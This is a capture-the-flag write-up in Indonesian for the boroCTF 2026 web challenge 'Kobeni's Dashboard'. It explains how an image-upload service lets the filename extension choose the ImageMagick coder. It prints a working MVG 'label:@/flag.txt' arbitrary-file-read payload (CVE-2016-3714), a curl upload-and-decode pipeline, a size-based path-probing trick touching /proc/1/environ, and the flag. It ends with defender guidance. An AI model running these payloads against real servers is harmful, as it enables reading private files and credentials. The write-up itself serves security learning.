---
ctf: "boroCTF 2026"
kategori: "Web Exploitation"
challenge: "Kobeni's Dashboard"
flag: "boroCTF{I'v3_n3v3r_been_T0_sch00l_3ithEr}"
teknik: "ImageMagick 6 dengan policy.xml longgar; ekstensi filename yang dikontrol user memilih input coder, payload MVG label:@/flag.txt merender isi flag (CVE-2016-3714)"
sumber: "https://github.com/Abdelkad3r/boroCTF-2026"
---

# Kobeni's Dashboard — boroCTF 2026 (Web Exploitation)

## Deskripsi Singkat

Sebuah "Public Safety Division Devil Sighting Portal" bertema Chainsaw Man yang dijalankan oleh Kobeni Higashiyama. Kamu upload gambar; server mengembalikan thumbnail. HTML index-nya berisi petunjuk lewat komentar breadcrumb:

```html
<!-- Processor: see response headers -->
```

Header respons `x-processor: ImageMagick/unknown` cocok dengan petunjuk itu.

## Recon

Recon awal mengarah ke `convert` → ImageMagick → pertanyaan "versi IM-nya apa dan bagaimana policy-nya?". Jawaban akhirnya didapat dengan membaca source code Flask lewat `/proc/self/cwd/app.py` (memanfaatkan primitive LFI setelah ditemukan). Blok kode yang relevan:

```python
ext       = os.path.splitext(filename)[1].lower().lstrip('.')
input_arg = f'{ext}:{upload_path}' if ext else upload_path
subprocess.run(['convert', input_arg, thumb_path], timeout=5, check=False)
```

Dua masalah ini saling memperkuat:

1. Input coder ImageMagick dipilih berdasarkan ekstensi filename yang diupload (`{ext}:{upload_path}`). Form HTML mengklaim hanya menerima JPG/PNG/GIF/BMP, tapi server dengan senang hati menerima `.mvg`, `.svg`, `.msl`, `.ps`, atau apa pun yang punya coder di ImageMagick.
2. Build IM-nya adalah **ImageMagick 6 (Q16) di Ubuntu 18.04** (`/usr/bin/convert-im6.q16`) dengan `policy.xml` yang longgar. Primitive LFI era 2016 yang dikenal sebagai "ImageTragick" — `label:@<path>` — masih hidup.

## Analisis — Bug-nya Apa

Format MVG (Magick Vector Graphics) milik ImageMagick mendukung pseudo-coder `label:@<path>` yang membaca file di `<path>` dan merender isinya sebagai teks di dalam gambar output. Dengan policy yang longgar, ini menjadi primitive arbitrary-file-read (CVE-2016-3714).

CVE-2022-44268 (kebocoran chunk tEXt PNG `profile=path`) dicoba lebih dulu, tapi sudah dipatch di server ini: server menghapus/mengabaikan chunk `Raw profile type *`. Vector MVG dari tahun 2016 hidup di level coder, bukan di parser PNG, dan patch level-policy untuk itu ternyata tidak pernah diterapkan.

## Eksploitasi / Solusi

**Payload yang berhasil.** Simpan sebagai `evil.mvg`:

```mvg
push graphic-context
viewbox 0 0 5000 600
font-size 80
image Over 0,0 0,0 'label:@/flag.txt'
pop graphic-context
```

Viewbox dan font-size diatur agar teks yang dirender cukup besar untuk dibaca mata langsung (OCR sering mengacaukan leetspeak).

**Pipeline sekali jalan:**

```bash
INSTANCE=https://<your-instance>.boroctf.com
TARGET=/flag.txt

printf "push graphic-context
viewbox 0 0 5000 600
font-size 80
image Over 0,0 0,0 'label:@%s'
pop graphic-context
" "$TARGET" > /tmp/x.mvg

curl -s -F "file=@/tmp/x.mvg;filename=evil.mvg;type=image/x-mvg" "$INSTANCE/upload" \
  | grep -oE 'data:image/png;base64,[A-Za-z0-9+/=]+' \
  | sed 's|data:image/png;base64,||' | base64 -d > /tmp/flag.png

open /tmp/flag.png        # baca secara visual; OCR mengacaukan leetspeak
```

PNG yang dikembalikan merender isi file sebagai label. Buka dan baca bitmap-nya langsung:

```
boroCTF{I'v3_n3v3r_been_T0_sch00l_3ithEr}
```

Flag ini adalah kalimat khas Denji dari Chainsaw Man. **Jebakan OCR:** tanda `'` pada `I'v3` adalah apostrof ASCII asli, tapi Tesseract bisa saja membacanya sebagai `!`. Pertukaran `0`/`o` semakin membingungkan OCR. Percaya pada bitmap-nya, bukan hasil OCR.

**Trik path-probing.** Setelah primitive ini berjalan, ukuran PNG hasil respons bisa dijadikan oracle keberadaan path. Pada `viewbox 1600x1200`, font-size 18, tiga rentang ukuran terpisah dengan jelas:

- **~1551 byte** = label kosong (file kosong, tidak terbaca, atau berisi null-separator; ini adalah signature berguna untuk `/proc/1/environ`).
- **~6–9 KB** = IM merender literal `@/path/to/thing` sebagai label (path tidak ter-expand).
- **≥10 KB** = file benar-benar ada dan IM merender isinya.

`/flag.txt` menghasilkan ~8.7 KB — *sedikit di bawah* filter naif "≥10 KB" (karena string flag-nya pendek). Solusinya: turunkan threshold dan periksa manual setiap kandidat yang berbeda dari baseline literal-`@`-path.

**Jalan buntu yang perlu diketahui.** CVE-2022-44268 (baca profile PNG) sudah dipatch. Coder MSL (`<image><read filename="…"/></image>`) dinonaktifkan lewat policy. SVG XXE diblokir (entity tidak ter-expand). `<text>@/path</text>` di SVG tidak memicu expansion `@` karena itu spesifik untuk MVG. Injeksi filename lewat `subprocess.run` tidak berhasil karena server memakai bentuk list (list form), bukan shell.

## Catatan / Insight

**Pola untuk defender:** pilih input coder secara hardcode di sisi server (misalnya selalu `png:`), validasi berdasarkan magic bytes, dan perketat `policy.xml`. Desain `{ext}:{upload_path}` adalah akar masalahnya; bahkan whitelist ketat di sisi client pun tidak berguna karena **server**-lah yang membiarkan filename memilih coder-nya.

## Flag

```
boroCTF{I'v3_n3v3r_been_T0_sch00l_3ithEr}
```
